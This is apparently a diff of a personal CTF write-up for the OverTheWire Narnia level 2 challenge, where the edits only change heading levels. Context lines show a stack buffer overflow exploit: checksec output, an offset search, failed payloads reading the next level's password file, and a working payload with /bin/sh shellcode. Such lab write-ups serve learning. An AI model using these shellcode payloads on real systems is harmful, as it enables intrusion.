@@ -9,7 +9,7 @@ eleventyNavigation:
     title: narnia 2 walkthrough
     order: 30
 ---
-# Description
+## Description
 > 
 
 connect
@@ -26,7 +26,7 @@ a
 ```
 
 ---
-# Hint
+## Hint
 - https://mks.tw/2984/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-%E5%BE%9E%E6%AF%AB%E7%84%A1%E5%9F%BA%E7%A4%8E%E9%96%8B%E5%A7%8B-pwn-shellcode-%E5%AF%A6%E4%BD%9C#%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE
 - https://tech-blog.cymetrics.io/posts/crystal/pwn-intro-2/
 - https://tech-blog.cymetrics.io/posts/crystal/reverse-01/
@@ -34,7 +34,7 @@ a
 
 ---
 
-# Progress
+## Progress
 First check the security properties.
 ```bash
 $ checksec /narnia/narnia2
@@ -65,7 +65,7 @@ gef➤  pattern search 0x62616169
 [+] Found at offset 132 (little-endian search) likely
 ```
 
-## Failed Payload
+### Failed Payload
 Failed Payload :
 ```
 `{ shellcraft -f r cat /etc/narnia_pass/narnia3 ; printf 'a%0.s' {1..69}; python3 -c 'print("\x98\xd0\xff\xff")' ;}`
@@ -82,7 +82,7 @@ Failed Payload 3:
 ```
 Reason: The shellcode includes several push commands. After those commands were executed, the shellcode were overwritten. In other words, esp pointed to the shellcode.
 
-## Success
+### Success
 [Success payload](https://axcheron.github.io/writeups/otw/narnia/):
 ```
 $(printf '\x90%0.s' {1..100}; printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'; printf '\x90%0.s' {1..4}; printf '\x38\xd4\xff\xff')
@@ -132,12 +132,12 @@ python3 test.py
 ```
 
 ---
-# Solving
+## Solving
 
-## Techniques
+### Techniques
 - [[shellcode]]
 
-## Tools
+### Tools
 - [[gef]]
 - [[checksec]]
 - ltrace
